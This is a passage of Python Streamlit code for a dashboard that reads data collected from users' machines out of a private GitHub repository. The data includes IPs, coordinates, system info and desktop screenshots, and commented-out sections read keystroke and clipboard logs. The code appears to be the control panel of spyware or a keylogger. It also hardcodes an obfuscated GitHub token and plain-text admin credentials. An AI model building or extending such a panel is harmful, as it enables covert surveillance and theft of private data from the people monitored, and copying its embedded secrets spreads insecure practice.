# user loging --> Active users Dashboard - count files(logs, cache , config , keylogerror file content viewer) - Download Files
# optimized for streamlit
# option to show files content 

import re
import os
import ast
import json
import time
import hashlib
import requests
import pandas as pd 
import streamlit as st
from io import BytesIO
import plotly.express as px
from datetime import datetime
from PIL import Image, ImageFile
from streamlit_image_zoom import image_zoom
from zoneinfo import ZoneInfo  # Python 3.9+


# URL containing the tokens JSON
TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
# Default token if URL fetch fails
DEFAULT_TOKEN = "asdfg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aefthu"

# Your GitHub Personal Access Token
DATA_URL = "https://raw.githubusercontent.com/bebedudu/programfeedback/refs/heads/main/upmenu/activeusers.txt"
SCREENSHOT_API_URL = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu/upmenufeedback"
SCREENSHOT_BASE_URL = "https://raw.githubusercontent.com/bebedudu/programfeedback/refs/heads/main/upmenu/upmenufeedback/"
CACHE_REPO_URL = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu/cache"
CONFIG_REPO_URL = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu/config"
ERRORLOG_REPO_URL = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu/errorlog"
BOOKMARKS_REPO_URL = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu/bookmarks"
SHORTCUTS_REPO_URL = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu/shortcuts"


last_line = 50 # Number of lines to fetch
cache_time = 90  # Cache time in seconds
last_screenshot = 30  # Number of screenshots to fetch

def get_token():
    try:
        # Fetch the JSON from the URL
        response = requests.get(TOKEN_URL)
        if response.status_code == 200:
            token_data = response.json()

            # Check if the "dashboard" key exists
            if "dashboard" in token_data:
                token = token_data["dashboard"]

                # Remove the first 5 and last 6 characters
                processed_token = token[5:-6]
                # print(f"Token fetched and processed: {processed_token}")
                return processed_token
            else:
                print("Key 'dashboard' not found in the token data.")
        else:
            print(f"Failed to fetch tokens. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred while fetching the token: {e}")

    # Fallback to the default token
    print("Using default token.")
    return DEFAULT_TOKEN[5:-6]

# Call the function
GITHUB_TOKEN = get_token()
# print(f"Final Token: {GITHUB_TOKEN}")


# Encrypted username and password
USERNAME_HASH = hashlib.sha256("bibek48".encode()).hexdigest()
PASSWORD_HASH = hashlib.sha256("adminbibek".encode()).hexdigest()

# Function to validate login credentials
def authenticate_user(username, password):
    username_encrypted = hashlib.sha256(username.encode()).hexdigest()
    password_encrypted = hashlib.sha256(password.encode()).hexdigest()
    return username_encrypted == USERNAME_HASH and password_encrypted == PASSWORD_HASH

# Function to fetch the last 10 lines from active user text the private repository
@st.cache_data(ttl=cache_time)
def fetch_last_10_lines_private(url, token):
    headers = {
        "Authorization": f"token {token}"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        lines = response.text.strip().split("\n")
        return lines[-last_line:]  # Return the last 10 lines
    except requests.RequestException as e:
        st.error(f"Failed to fetch data: {e}")
        return []

# Function to safely parse System Info
@st.cache_data(ttl=cache_time)
def preprocess_system_info(system_info_str):
    """
    Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
    with a placeholder or simplified representation.
    """
    system_info_str = re.sub(r"sdiskpart\(.*?\)", "'Disk Partition'", system_info_str)  # Replace sdiskpart objects
    try:
        system_info = ast.literal_eval(system_info_str)
    except Exception as e:
        st.warning(f"Error parsing System Info: {e}")
        system_info = {"Error": "Unable to parse System Info"}
    return system_info

# Function to parse active user info
@st.cache_data(ttl=cache_time)
def parse_active_user_info(lines):
    active_user_data = []
    for line in lines:
        match = re.search(r"(?P<timestamp>\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}) - User: (?P<username>.*?), Unique_ID: (?P<Unique_ID>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?), Postal: (?P<Postal>.*?),", line
        )
        if match:
            user_data = match.groupdict()
            # Combine username and Unique_ID into a single field
            # user_data["username"] = f"{user_data['username']}_{user_data['Unique_ID']}"
            # active_user_data.append(user_data)
            
            # Extract the first two characters of the location
            location_prefix = user_data["location"][:2]
            # Combine location prefix, username, and Unique_ID into the user field
            user_data["username"] = f"{user_data['username']}_{location_prefix}_{user_data['Unique_ID']}"
            active_user_data.append(user_data)
    return active_user_data


# Function to parse user info
@st.cache_data(ttl=cache_time)
def parse_user_info(lines):
    user_data = []
    for line in lines:
        user_info = {}
        user_info["raw"] = line
        
        timestamp_match = re.match(r"^(?P<timestamp>[\d-]+ [\d:]+) -", line)
        if timestamp_match:
            user_info["timestamp"] = timestamp_match.group("timestamp")
            
        match = re.search(
            r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?),",
            line
        )
        if match:
            user_info.update(match.groupdict())
            
            # Add location prefix to the user field
            location_prefix = user_info["location"][:2]  # Extract first 2 characters of location
            user_info["username"] = f"{location_prefix}_{user_info['username']}"  # Add location prefix to username
        
        # Extract system info details
        system_info_match = re.search(r"System Info: (?P<system_info>{.*})", line)
        if system_info_match:
            system_info_str = system_info_match.group("system_info")
            user_info["system_info"] = preprocess_system_info(system_info_str)
        
        user_data.append(user_info)
    return user_data



# last 30 screenshots
# To handle truncated images
ImageFile.LOAD_TRUNCATED_IMAGES = True

# GitHub API details
GITHUB_API_URL_SS = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu/upmenufeedback"
HEADERS_SS = {"Authorization": f"token {GITHUB_TOKEN}"}

# Function to get image URLs
def get_image_urls(limit=30):
    response = requests.get(GITHUB_API_URL_SS, headers=HEADERS_SS)
    if response.status_code == 200:
        files = response.json()
        image_files = [(file["name"], file["download_url"]) for file in files if file["name"].lower().endswith(('png', 'jpg', 'jpeg'))]
        return image_files[-limit:][::-1]  # Get last 'limit' images in reverse order
    else:
        st.error("Failed to fetch images. Check your API token and repository access.")
        return []

# Authenticate GitHub API
def authenticate_github():
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    return headers

# Fetch GitHub API rate limit information
def get_github_rate_limit():
    headers = authenticate_github()
    url = "https://api.github.com/rate_limit"
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        rate_limit_data = response.json()
        
        # Extract rate limit information
        limit = rate_limit_data['resources']['core']['limit']
        remaining = rate_limit_data['resources']['core']['remaining']
        reset_timestamp = rate_limit_data['resources']['core']['reset']
        
        # Convert reset timestamp to readable format
        reset_time = datetime.fromtimestamp(reset_timestamp).strftime('%Y-%m-%d %H:%M:%S')
        
        return limit, remaining, reset_time
    except Exception as e:
        st.error(f"Error fetching rate limit: {e}")
        return 5000, "Unknown", "Unknown"  # Default values

# Fetch the last 30 screenshots from the GitHub API
@st.cache_data(ttl=cache_time)  # Cache for 5 minutes
def fetch_screenshots():
    headers = authenticate_github()
    try:
        response = requests.get(SCREENSHOT_API_URL, headers=headers)
        response.raise_for_status()
        files = response.json()
        screenshots = []
        for file in files[-last_screenshot:]:  # Fetch only the last 30 screenshots
            if file["name"].endswith(".png"):
                try: 
                    # 20250123_141302_bibek_screenshot_2025-01-23_14-12-19.png
                    # 20250125_124537_bibek_4C4C4544-0033-3910-804A-B3C04F324233_screenshot_2025-01-25_12-45-12.png
                    # Split the filename to extract details
                    name_parts = file["name"].split("_")
                    if len(name_parts) < 3:  # Ensure enough parts for parsing
                        st.warning(f"Skipping improperly formatted file: {file['name']}")
                        continue
                    date_time = name_parts[0] + name_parts[1]  # YYYYMMDD + HHMMSS
                    # user = name_parts[2]  # Extract user name
                    user = name_parts[2]+ name_parts[3]  # Extract user name
                    date_time = name_parts[0] + name_parts[1]  # Combine YYYYMMDD and HHMMSS
                    timestamp = datetime.strptime(date_time, "%Y%m%d%H%M%S")  # Parse into a datetime object
                    screenshots.append({
                        "name": file["name"],
                        "url": file["download_url"],
                        "user": user,
                        "timestamp": timestamp,
                    })
                except ValueError:
                    st.warning(f"Unable to parse filename: {file['name']}")
        return sorted(screenshots, key=lambda x: x["timestamp"], reverse=True)
    except requests.RequestException as e:
        st.error(f"Failed to fetch screenshot data: {e}")
        return []

# Download an image from a URL
def download_image(url):
    headers = authenticate_github()
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return BytesIO(response.content)  # Return image as BytesIO object
    else:
        return None

# Function to cache and retrieve image data
@st.cache_data(ttl=3600)  # Cache for 1 hour
def get_image_data(url):
    try:
        return requests.get(url).content
    except Exception as e:
        st.error(f"Failed to load image: {e}")
        return None

# Function to check for new screenshots
def check_new_screenshots(latest_timestamp):
    # Fetch the latest screenshots
    screenshots = fetch_screenshots()
    # Check if there are new screenshots
    if screenshots and screenshots[0]["timestamp"] > latest_timestamp:
        return True, screenshots
    return False, screenshots

# Function to detect anomalies in user activity
@st.cache_data(ttl=cache_time)
def detect_anomalies(user_data):
    anomalies = []
    ALLOWED_COUNTRIES = ["US", "USA"]
    processed_ids = set()  # Track processed Unique IDs instead of usernames
    
    for user in user_data:
        # Extract country code from location (first part before comma)
        country_code = user["location"].split(",")[0].strip()
        
        if country_code not in ALLOWED_COUNTRIES:
            # Get the actual Unique_ID from the raw data
            unique_id = re.search(r"Unique_ID: (\S+)", user["raw"]).group(1)
            
            if unique_id not in processed_ids:
                anomalies.append({
                    "user": user["username"],
                    "reason": f"Restricted country access: {country_code} ({user['location']})",
                    "unique_id": unique_id
                })
                processed_ids.add(unique_id)
    
    return anomalies


# Function to filter screenshots based on user and date range
@st.cache_data(ttl=cache_time)
def filter_screenshots(screenshot_data, user, start_date, end_date):
    filtered_screenshots = [
        screenshot for screenshot in screenshot_data
        if (user == "All Users" or screenshot["user"] == user) and
           (start_date <= screenshot["timestamp"].date() <= end_date)
    ]
    return filtered_screenshots







# # log files
# Function to get unique users
@st.cache_data(ttl=cache_time)
def get_unique_users(user_data):
    seen_users = set()
    unique_users = []
    for user in user_data:
        if user["username"] not in seen_users:
            seen_users.add(user["username"])
            unique_users.append(user)
    return unique_users


# # Function to fetch file list from GitHub
# @st.cache_data(ttl=cache_time)
# def get_github_files(repo_url, file_extension):
#     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
#     response = requests.get(repo_url, headers=headers)
#     if response.status_code == 200:
#         return [file for file in response.json() if file['name'].endswith(file_extension)]
#     else:
#         st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
#         return []

# # Function to extract unique usernames from filenames
# @st.cache_data(ttl=cache_time)
# def extract_unique_users(file_list, pattern):
#     user_files = {}
    
#     for file in file_list:
#         filename = file['name']
#         match = re.match(pattern, filename)
#         if match:
#             user_id = match.group(1)
#             user_files[user_id] = file['download_url']  # Keep only the latest file for each user
    
#     return sorted(user_files.keys()), user_files

# # Function to fetch file content
# @st.cache_data(ttl=cache_time)
# def get_file_content(url):
#     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         return response.text
#     else:
#         st.error("Failed to fetch file content.")
#         return None

# # for log files
# # Function to fetch file list from GitHub
# @st.cache_data(ttl=cache_time)
# def get_github_files_logs(repo_url, file_extensions):
#     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
#     response = requests.get(repo_url, headers=headers)
#     if response.status_code == 200:
#         return [file for file in response.json() if any(file['name'].endswith(ext) for ext in file_extensions)]
#     else:
#         st.error(f"Failed to fetch files from {repo_url}. Check API Key and Repository Access.")
#         return []

# # Function to extract unique usernames and their corresponding files
# @st.cache_data(ttl=cache_time)
# def extract_unique_users_logs(file_list, pattern, is_log=False):
#     user_files = {}
#     unique_users = set()
    
#     for file in file_list:
#         filename = file['name']
#         match = re.match(pattern, filename)
#         if match:
#             user_id = match.group(1)  # Extract unique username
#             unique_users.add(user_id)  # Store only the unique username
#             file_type = match.group(2) if is_log else "default"
#             key = f"{user_id}_{file_type}"  # Ensure uniqueness for each user and file type
#             if key not in user_files:
#                 user_files[key] = (filename, file['download_url'])  # Store without date_time prefix
    
#     return sorted(unique_users), user_files






# files count
# GitHub API base URL
GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/programfeedback/contents/upmenu"

# GitHub repository folders to check
FOLDERS = {
    "Cache": "cache",
    "Config": "config",
    "Bookmarks": "bookmarks",
    "Errorlog": "errorlog",
    "Shortcuts": "shortcuts",
    "Screenshots": "upmenufeedback",
}

# Function to get the list of files in a folder
@st.cache_data(ttl=cache_time)
def get_number_of_files(folder):
    url = f"{GITHUB_API_BASE_URL}/{folder}"

# # download files from github repo
# # Maximum number of retries for file download
# MAX_RETRIES = 3
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        files = response.json()
        return files  # Return the list of files
    else:
        st.error(f"Failed to fetch data for {folder}: {response.status_code}")
        return []

# # Folder to store downloaded files
# DOWNLOAD_FOLDER = "downloads_activity"

# # Create the download folder if it doesn't exist
# if not os.path.exists(DOWNLOAD_FOLDER):
#     os.makedirs(DOWNLOAD_FOLDER)

# # Function to extract unique user name from filename
# @st.cache_data(ttl=cache_time)
# def extract_unique_user_name(file_name):
#     try:
#         # Extract unique user name from filename (e.g., "bibek_4C4C4544-0033-3910-804A-B3C04F324233")
#         return "_".join(file_name.split("_")[2:4])  # "bibek_4C4C4544-0033-3910-804A-B3C04F324233"
#     except (IndexError, ValueError):
#         return None

# # Function to parse date and time from filename
# @st.cache_data(ttl=cache_time)
# def parse_datetime_from_filename(file_name):
#     try:
#         # Extract date and time from filename (e.g., "20250129_090616_bibek_...")
#         date_str = file_name.split("_")[0]  # "20250129"
#         time_str = file_name.split("_")[1]  # "090616"
#         return datetime.strptime(f"{date_str} {time_str}", "%Y%m%d %H%M%S")
#     except (IndexError, ValueError):
#         return None

# # Function to download files with advanced options
# @st.cache_data(ttl=cache_time)
# def download_files_advanced(folder, terminal_placeholder, start_date=None, end_date=None, num_files=None, unique_user_name=None):
#     files = get_number_of_files(folder)
#     if not files:
#         return

#     # Initialize or update the session state for logs
#     if "download_logs" not in st.session_state:
#         st.session_state.download_logs = "Download Log:\n"

#     # Filter files by date and time range
#     filtered_files = []
#     for file in files:
#         file_name = file["name"]
#         file_datetime = parse_datetime_from_filename(file_name)

#         if start_date and end_date and file_datetime:
#             if not (start_date <= file_datetime <= end_date):
#                 continue  # Skip files outside the date range

#         # Filter files by unique user name
#         if unique_user_name:
#             file_user_name = extract_unique_user_name(file_name)
#             if file_user_name != unique_user_name:
#                 continue  # Skip files that don't match the unique user name

#         filtered_files.append(file)

#     # Sort files in reverse order (from last to first)
#     filtered_files.sort(key=lambda x: x["name"], reverse=True)

#     # Limit the number of files to download
#     if num_files:
#         filtered_files = filtered_files[:num_files]

#     # Download the filtered files
#     for file in filtered_files:
#         file_name = file["name"]
#         file_url = file["download_url"]

#         # Download the file
#         response = requests.get(file_url, headers={"Authorization": f"token {GITHUB_TOKEN}"})
#         if response.status_code == 200:
#             # Save the file in the download folder
#             file_path = os.path.join(DOWNLOAD_FOLDER, file_name)
#             with open(file_path, "wb") as f:
#                 f.write(response.content)
#             st.session_state.download_logs = f"Downloaded: {file_path}\n{st.session_state.download_logs}"
#         else:
#             st.session_state.download_logs = f"Failed to download: {file_name}\n{st.session_state.download_logs}"

#         # Update the terminal-like box
#         terminal_placeholder.markdown(
#             f"""
#             <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
#                 <pre>{st.session_state.download_logs}</pre>
#             </div>
#             """,
#             unsafe_allow_html=True
#         )


def tabbeddashboard():

    st.title("GitHub Repository File Manager")
    # Create tabs
    # tab1, tab2, tab3 = st.tabs(["Count Files", "Delete Files", "Active users Dashboard"])
    # Create tabs
    tab1, tab5 = st.tabs(["Active users Dashboard", "Download Files"])
    
    
    # Tab 1: Active users Dashboard
    with tab1:
        st.header("Active users Dashboard") 
        # Fetch and display GitHub API rate limit information
        limit, remaining_token, reset_time = get_github_rate_limit()
        st.sidebar.info(f"GitHub API Rate Limit: {limit}, Remaining: {remaining_token}, Reset Time: {reset_time}")

        # Main Dashboard App
        def dashboard():
            # Initialize session state to store previously seen users
            if "seen_users" not in st.session_state:
                st.session_state["seen_users"] = set()
            st.title("Detailed Active User Activity Dashboard")
            st.write("Explore detailed information of active users.")
            # Fetch and parse the data
            lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
            user_data = parse_user_info(lines)
            active_user_data = parse_active_user_info(lines)
            screenshot_data = fetch_screenshots()
            st.sidebar.header("Active User Activity Dashboard")
            if user_data:
                # Get unique users
                unique_users = get_unique_users(user_data)
                user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option
                # Sidebar to select a user
                selected_user = st.sidebar.selectbox("Select a User", user_list)
                # Filter data based on selection
                if selected_user != "All":
                    filtered_users = [user for user in unique_users if user["username"] == selected_user]
                else:
                    filtered_users = unique_users  # Only show unique users        
                # Title and "Update Dashboard" Button
                col1, col2 = st.columns([8, 1])  # Adjust column widths as needed
                with col1:
                    st.title(f"Active Users: {len(filtered_users)}")
                with col2:
                    if st.button("Update Dashboard"):
                        fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
                # Identify new active users
                current_users = set(user["username"] for user in unique_users)
                new_users = current_users - st.session_state["seen_users"]
                st.session_state["seen_users"].update(current_users)
                # Display notification for new active users
                for new_user in new_users:
                    st.info(f"🚨 **{new_user} is active now!**")
                # Streamlit app
                # st.title("Active Users")
                st.write("Dashboard showing unique active users and their details.")
                # Convert to DataFrame for display
                df = pd.DataFrame(active_user_data).drop_duplicates(subset="username")
                st.table(df)  # Display as a table
                # Fetch data from the URL
                @st.cache_data(ttl=cache_time)  # Cache the data for 60 seconds to avoid frequent network calls
                def fetch_data_from_url():
                    import requests
                    response = requests.get(DATA_URL)
                    if response.status_code == 200:
                        lines = response.text.strip().split("\n")[-last_line:]  # Get the last 10 lines
                        return parse_user_info(lines)
                    else:
                        st.error("Failed to fetch data from the URL.")
                        return []
                # Create a DataFrame for visualizations
                df = pd.DataFrame(filtered_users)
                df["city"] = df["location"].apply(lambda loc: loc.split(",")[1].strip() if "," in loc else "Unknown")
                df["country"] = df["location"].apply(lambda loc: loc.split(",")[0].strip() if "," in loc else "Unknown")
                # Display details of filtered users (details of active user)
                st.title("Active User Dashboard")
                st.write(f"### Active Users: {len(filtered_users)}")
                for user in filtered_users:
                    # Use the extracted timestamp
                    # timestamp = user["timestamp"]
                    # with st.expander(f"Details for User: {user['username']} (IP: {user['ip']}, Last Active: {timestamp})"):
                    with st.expander(f"Details for User: {user['username']} (Last Active: {user['timestamp']})"):
                        st.write(f"**Timestamp:** {user.get('timestamp', 'N/A')}")
                        st.write(f"**Location:** {user['location']}")
                        st.write(f"**Organization:** {user['org']}")
                        st.write(f"**Coordinates:** {user['coordinates']}")
                        # Display System Info in a table
                        if "system_info" in user:
                            system_info_df = pd.DataFrame(
                                user["system_info"].items(), columns=["Property", "Value"]
                            )
                            st.write("### System Info:")
                            st.table(system_info_df)
                # Add Visualization for Country/City Distribution
                st.write("## User Distribution by Country and City")
                # Bar Chart for Countries
                country_counts = df["country"].value_counts().reset_index()
                country_counts.columns = ["Country", "Count"]
                st.write("### Country Distribution")
                country_chart = px.bar(country_counts, x="Country", y="Count", title="Active Users by Country")
                st.plotly_chart(country_chart, use_container_width=True)
                # Bar Chart for Cities
                city_counts = df["city"].value_counts().reset_index()
                city_counts.columns = ["City", "Count"]
                st.write("### City Distribution")
                city_chart = px.bar(city_counts, x="City", y="Count", title="Active Users by City")
                st.plotly_chart(city_chart, use_container_width=True)
                
                # Extract unique usernames from the screenshot data
                unique_users_screenshot = list({s["user"] for s in screenshot_data})  # Set to remove duplicates, then convert to list
                unique_users_screenshot.sort()  # Optional: Sort usernames alphabetically
                # Add "All Users" as the first option
                unique_users_screenshot.insert(0, "All Users")
                # Sidebar for user selection
                selected_user = st.sidebar.selectbox("Select User (Screenshot)", unique_users_screenshot)
                # Add custom CSS for overlaying the download button
                st.markdown(
                    """
                    <style>
                    .image-container {
                        position: relative;
                        display: inline-block;
                    }
                    .download-button {
                        position: absolute;
                        top: 10px;
                        right: 10px;
                        background-color: rgba(255, 255, 255, 0.8);
                        padding: 5px;
                        border-radius: 50%;
                        box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.2);
                    }
                    .download-button img {
                        width: 25px;
                        height: 25px;
                    }
                    </style>
                    """,
                    unsafe_allow_html=True,
                )
                st.write("## User Latest Screenshots")
                # Display the latest screenshot for the selected user
                if selected_user == "All Users":
                    # Show the latest screenshot for each user
                    latest_screenshots = {}
                    for s in screenshot_data:
                        if s["user"] not in latest_screenshots:
                            latest_screenshots[s["user"]] = s
                    
                    # Create a grid layout with 4 images per row
                    screenshots_list = list(latest_screenshots.values())
                    num_screenshots = len(screenshots_list)
                    
                    # Use progress indicator for loading
                    with st.spinner("Loading images..."):
                        # Display images in rows of 4
                        for i in range(0, num_screenshots, 4):
                            # Create 4 columns for each row
                            cols = st.columns(4)
                            
                            # Fill each column with an image (if available)
                            for j in range(4):
                                if i + j < num_screenshots:
                                    screenshot = screenshots_list[i + j]
                                    with cols[j]:
                                        try:
                                            # Cache the image data
                                            image_data = get_image_data(screenshot["url"])
                                            if image_data:
                                                st.image(
                                                    image_data,
                                                    caption=f"{screenshot['user']}\n{screenshot['timestamp']}",
                                                    use_container_width=True,
                                                )
                                                # Use the cached image data for download
                                                st.download_button(
                                                    label="Download",
                                                    data=image_data,
                                                    file_name=screenshot["name"],
                                                    mime="image/png",
                                                    key=f"download_{i}_{j}"
                                                )
                                            else:
                                                st.warning(f"Image for {screenshot['user']} failed to load")
                                        except Exception as e:
                                            st.error(f"Error displaying image: {str(e)}")
                else:
                    # Show screenshots for the selected user in a grid
                    user_screenshots = [s for s in screenshot_data if s["user"] == selected_user]
                    # Sort screenshots by timestamp (newest first)
                    user_screenshots = sorted(user_screenshots, key=lambda x: x["timestamp"], reverse=True)
                    
                    num_screenshots = len(user_screenshots)
                    
                    # Use progress indicator for loading
                    with st.spinner("Loading images..."):
                        # Display images in rows of 4
                        for i in range(0, num_screenshots, 4):
                            # Create 4 columns for each row
                            cols = st.columns(4)
                            
                            # Fill each column with an image (if available)
                            for j in range(4):
                                if i + j < num_screenshots:
                                    screenshot = user_screenshots[i + j]
                                    with cols[j]:
                                        try:
                                            # Cache the image data
                                            image_data = get_image_data(screenshot["url"])
                                            if image_data:
                                                st.image(
                                                    image_data,
                                                    caption=f"{screenshot['timestamp']}",
                                                    use_container_width=True,
                                                )
                                                # Use the cached image data for download
                                                st.download_button(
                                                    label="Download",
                                                    data=image_data,
                                                    file_name=screenshot["name"],
                                                    mime="image/png",
                                                    key=f"download_user_{i}_{j}"
                                                )
                                            else:
                                                st.warning("Image failed to load")
                                        except Exception as e:
                                            st.error(f"Error displaying image: {str(e)}")
                # Check for new screenshots
                new_screenshots, current_screenshots = check_new_screenshots(screenshot_data[0]["timestamp"])
                if new_screenshots:
                    st.warning("🚨 New screenshots detected! Please refresh the page to view the latest screenshots."
                               " Click the 'Update Data' button in the sidebar to refresh the data.")
                
                # Initialize latest timestamp
                if "latest_timestamp" not in st.session_state:
                    st.session_state.latest_timestamp = datetime.min
                # Check for new screenshots
                has_new_data, updated_screenshot_data = check_new_screenshots(st.session_state.latest_timestamp)
                # Display alert if new data is available
                if has_new_data:
                    st.session_state.latest_timestamp = max([s["timestamp"] for s in updated_screenshot_data])
                    st.sidebar.warning("🔔 New screenshots/logs detected! Refresh to view them.")
                # Button to refresh manually
                if st.sidebar.button("Refresh Now"):
                    fetch_screenshots.clear()  # Clear cache for this function
                    if "refresh_needed" not in st.session_state:
                        st.session_state.refresh_needed = False
                    if st.session_state.refresh_needed:
                        # Fetch new data or rerun parts of your logic here
                        st.write("Data has been refreshed!")
                        st.session_state.refresh_needed = False
                
                
                
                
                
                # Display the last 30 screenshots
                # # Sidebar filters
                # show_screenshots = st.sidebar.checkbox("Show Recent Screenshots", value=False)
                # if show_screenshots:
                #     st.title("Screenshot Gallery")
                #     # User filter
                #     users = ["All Users"] + sorted(set(s["user"] for s in screenshot_data))
                #     selected_user = st.sidebar.selectbox("Select User", users)
                #     # Date filter
                #     start_date = st.sidebar.date_input("Start Date", value=datetime.now().date())
                #     end_date = st.sidebar.date_input("End Date", value=datetime.now().date())
                #     # Filter screenshots
                #     filtered_screenshots = filter_screenshots(screenshot_data, selected_user, start_date, end_date)
                #     # Display screenshots in a gallery layout
                #     col1, col2, col3 = st.columns(3)
                #     for i, screenshot in enumerate(filtered_screenshots):
                #         col = [col1, col2, col3][i % 3]
                #         with col:
                #             st.image(
                #                 download_image(screenshot["url"]),
                #                 caption=f"{screenshot['user']} - {screenshot['timestamp']}",
                #                 use_container_width=True
                #             )
                
                
                # # Show latest images
                # num_images = st.sidebar.number_input("Number of images to display", min_value=1, max_value=100, value=30, step=1)
                # show_images = st.sidebar.checkbox("Show Recent Images")

                # if show_images:
                #     st.title("GitHub Image Gallery")
                #     image_files = get_image_urls(num_images)
                #     if image_files:
                #         cols = st.columns(5)  # Display images in 5 columns
                #         for i, (name, url) in enumerate(image_files):
                #             response = requests.get(url, headers=HEADERS_SS)
                #             if response.status_code == 200:
                #                 try:
                #                     image = Image.open(BytesIO(response.content))
                #                     with cols[i % 5]:
                #                         st.image(image, use_container_width=True)
                #                         st.caption(name)  # Display image name
                #                 except OSError:
                #                     st.error(f"Failed to load image due to corruption: {name}")
                #             else:
                #                 st.error(f"Failed to load image: {name}")
                
                
                
                
                
                
                
                
                
                
                # # logs files
                # logs_files = get_github_files_logs(LOGS_REPO_URL, ["_key_log.txt", "_clipboard_log.txt", "_system_info.json"])
                # logs_users, logs_user_files = extract_unique_users_logs(logs_files, r"(?:\d{8}_\d{6}_)?(.+?)_([^_]+\.txt|[^_]+\.json)", is_log=True)
                # # Ensure unique usernames without duplicates from log file types
                # logs_users = sorted(set(user.split("_")[0] for user in logs_users))

                # # Combine users and ensure uniqueness
                # all_users = sorted(set(logs_users))
                # all_users.insert(0, "All Users")  # Add option to select all users
                
                # # Sidebar dropdown for user selection
                # selected_user = st.sidebar.selectbox("Select User (Logs File)", all_users)
                
                # # Show Logs Files
                # show_logs_files = st.sidebar.checkbox("Show Logs files")
                # if show_logs_files:
                #     st.subheader("Logs Files")
                #     filtered_logs_files = {k: v for k, v in logs_user_files.items() if selected_user == "All Users" or k.startswith(selected_user)}
                #     # 
                #     for key, (filename, file_url) in filtered_logs_files.items():
                #         with st.expander(f"**{filename}**: Show File Content"):
                #             content = get_file_content(file_url)
                #             if content:
                #                 st.text_area("File Content", content, height=300, disabled=True, key=f"logs_{filename}")
                #                 # 
                #                 st.write(f"[Open File Content]({file_url})")
                #                 # 
                #                 # Provide file download option
                #                 st.download_button(label="Download File", data=content, file_name=filename, mime="application/json", key=f"logs_dl_{filename}")

                #     # Fullscreen content view
                #     if "fullscreen_content" in st.session_state:
                #         st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
                #         st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")
                
                
                
                # # Fetch files from both repositories
                # cache_files = get_github_files(CACHE_REPO_URL, "_files_cache.json")
                # config_files = get_github_files(CONFIG_REPO_URL, "_config.json")
                # keylogerror_files = get_github_files(KEYLOGERROR_REPO_URL, "_keylogerror.log")

                # # Extract unique usernames separately
                # cache_users, cache_user_files = extract_unique_users(cache_files, r"(?:\d{8}_\d{6}_)?(.+?)_files_cache\.json")
                # config_users, config_user_files = extract_unique_users(config_files, r"(?:\d{8}_\d{6}_)?(.+?)_config\.json")
                # keylogerror_users, keylogerror_user_files = extract_unique_users(keylogerror_files, r"(?:\d{8}_\d{6}_)?(.+?)_keylogerror\.log")

                # # Combine users and ensure uniqueness
                # all_users = sorted(set(cache_users + config_users + keylogerror_users))
                # all_users.insert(0, "All Users")  # Add option to select all users

                # # Sidebar dropdown for user selection
                # selected_user = st.sidebar.selectbox("Select User (files)", all_users)
                   
                # # Show Cache Files
                # show_cache_files = st.sidebar.checkbox("Show Cache files")
                # if show_cache_files:
                #     st.subheader("Cache Files")
                #     filtered_cache_files = {k: v for k, v in cache_user_files.items() if selected_user == "All Users" or selected_user == k}

                #     for user, file_url in filtered_cache_files.items():
                #         with st.expander(f"**{user}_files_cache.json**: Show File Content"):
                #             content = get_file_content(file_url)
                #             if content:
                #                 st.text_area("File Content", content, height=300, disabled=True, key=f"cache_{user}")

                #                 st.write(f"[Open File Content]({file_url})")

                #                 # Button to open full-screen content
                #                 if st.button(f"View {user} File in Fullscreen", key=f"cache_btn_{user}"):
                #                     st.session_state["fullscreen_content"] = content
                #                     st.session_state["fullscreen_user"] = user
                #                     st.rerun()

                #                 # Provide file download option
                #                 st.download_button(label="Download File", data=content, file_name=f"{user}_files_cache.json", mime="application/json", key=f"cache_dl_{user}")

                # # Show Config Files
                # show_config_files = st.sidebar.checkbox("Show Config files")
                # if show_config_files:
                #     st.subheader("Config Files")
                #     filtered_config_files = {k: v for k, v in config_user_files.items() if selected_user == "All Users" or selected_user == k}

                #     for user, file_url in filtered_config_files.items():
                #         with st.expander(f"**{user}_config.json**: Show File Content"):
                #             content = get_file_content(file_url)
                #             if content:
                #                 st.text_area("File Content", content, height=300, disabled=True, key=f"config_{user}")

                #                 st.write(f"[Open File Content]({file_url})")

                #                 # Button to open full-screen content
                #                 if st.button(f"View {user} File in Fullscreen", key=f"config_btn_{user}"):
                #                     st.session_state["fullscreen_content"] = content
                #                     st.session_state["fullscreen_user"] = user
                #                     st.rerun()

